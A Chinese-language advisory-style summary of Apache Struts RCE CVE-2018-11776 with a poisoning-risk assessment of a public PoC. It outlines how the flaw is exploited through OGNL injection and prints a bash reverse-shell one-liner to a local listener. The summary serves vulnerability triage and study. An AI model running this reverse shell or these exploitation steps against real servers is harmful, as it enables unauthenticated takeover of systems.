## CVE-2018-11776 Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 设置为 true，且存在特定的命名空间配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-11776 是一个存在于 Apache Struts 2 中的远程代码执行漏洞。该漏洞的产生是由于 Struts 对命名空间处理不当，允许攻击者通过构造恶意的 URL 发起 OGNL 表达式注入，从而执行任意代码。

**有效性：**
根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，可以确认此漏洞是有效的。漏洞库信息将其描述为“possible Remote Code Execution”，搜索引擎结果中包含了大量的关于此漏洞的分析和利用的文章，漏洞利用代码提供了一个可行的 PoC。

**投毒风险：**
分析 PoC 代码内容：
* `Dockerfile`: 用于构建存在漏洞的 Struts2 环境，模拟漏洞存在场景,没有恶意代码。
* `README.md`: 提供了漏洞利用的详细步骤，包括环境搭建、配置修改、漏洞验证和命令执行/反弹 shell。其中涉及到命令执行和反弹shell的脚本，需要用户手动执行，但代码本身没有明显的恶意行为。
虽然提供的利用代码没有直接的恶意行为，但是仍然存在一定的投毒风险。例如，攻击者可以修改 exploit 脚本，在执行命令之前添加一些恶意的操作，例如植入后门程序或窃取敏感信息。由于用户需要手动执行这些脚本，因此存在一定的风险。考虑到 Dockerfile 和 exploit 脚本的透明性，以及需要用户手动修改配置和执行脚本，投毒的可能性较低，初步估计为 5%。

**利用方式：**
该漏洞的利用方式主要包括以下步骤：

1.  **环境准备：** 搭建存在漏洞的 Apache Struts 2 环境。可以使用提供的 Dockerfile 构建。
2.  **配置修改：** 修改 Struts 2 的配置文件 `struts.xml`，将 `struts.mapper.alwaysSelectFullNamespace` 设置为 `true`，并添加特定的 action 配置。
3.  **漏洞验证：** 使用提供的测试脚本验证目标是否易受攻击。该脚本会发送一个包含 OGNL 表达式的 URL，如果服务器返回预期的结果，则表明目标存在漏洞。
4.  **命令执行/反弹Shell：** 使用提供的命令执行脚本，构造包含 OGNL 表达式的 URL，执行任意命令。也可以通过反弹 shell 获取服务器的控制权。可以使用`/bin/bash -i >& /dev/tcp/172.17.0.1/31337 0>&1` 来执行反弹shell

**项目地址:** [hook-s3c/CVE-2018-11776-Python-PoC](https://github.com/hook-s3c/CVE-2018-11776-Python-PoC)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)